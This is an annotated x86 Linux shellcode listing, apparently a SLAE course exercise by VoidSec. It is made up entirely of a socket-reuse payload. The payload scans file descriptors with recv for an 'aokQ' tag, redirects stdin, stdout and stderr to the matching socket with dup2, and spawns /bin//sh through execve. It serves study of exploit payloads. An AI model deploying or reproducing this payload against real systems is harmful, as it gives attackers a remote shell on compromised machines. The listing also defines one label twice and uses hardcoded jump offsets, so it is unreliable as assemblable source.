; Paolo Stagno aka [VoidSec](https://voidsec.com)
; SLAE-1511

xor ebx,ebx					; zeroing out EBX = 0
push ebx					; push 0 on stack
mov esi,esp					; store current stack pointer to ESI
push byte +0x40				; push MSG_DONTWAIT flag on the stack
mov bh,0xa					; load 10 in BH
push ebx					; push EBX (0x0a00) on the stack, length argument
push esi					; push ESI value (pointer to our buffer)
push ebx					; push EBX (0x0a00)
mov ecx,esp					; store current stack pointer in ECX (pointer to function argument)
xchg bh,bl					; exchange BL and BH (0x0a goes into BL) SYS_RECV socketcall

loop_lbl: 					; loop_lbl
inc word [ecx]				; increment file descriptor value, used in the loop to go to the "next" socket connection
push byte +0x66				; push 0x66 (socketcall number) on the stack
pop eax						; pop 0x66 in EAX (socketcall systemcall)
int 0x80					; execute socketcall systemcall
cmp dword [esi],0x616f6b51	; compare the received value with "aokQ" tag
jnz 0x10					; if the value does not match we go back to loop_lbl

; we found our tag
dup_loop_lbl:				; dup_loop_lbl
pop edi						; pop sockfd into EDI
mov ebx,edi					; save sockfd value in EBX for our dup2 call
push byte +0x2				; push 2 on the stack (that will be used to perform 3 iterations in dup2 2,1,0)
pop ecx						; load the pushed 2 in ECX
dup_loop_lbl:				; dup_loop_lbl
push byte +0x3f				; push dup2 syscall value in the stack
pop eax						; load dup2 syscall value in EAX
int 0x80					; execute dup2 systemcall
dec ecx						; decrement our counter (From 2 to 0 stdin, stdout and stderr..)
jns 0x26					; if we didn't reach the end (-1) we loop bak to our dup_loop_lbl

; Execve
push byte +0xb				; psuh 11 on the stack
pop eax						; load 11 in EAX (execve sustemcall value)
cdq							; zeroing out EDX = 0
push edx					; EDX will act as null string terminator
push dword 0x68732f2f		; hs//
push dword 0x6e69622f		; nib/
mov ebx,esp					; load a pointer to /bin//sh in EBX
push edx					; push the null function argument to EDX
push ebx					; push /bin//shNULL pointer to EBX
mov ecx,esp					; move pointer to /bin//shNULL into ECX
int 0x80					; execute execve systemcall and pop our shell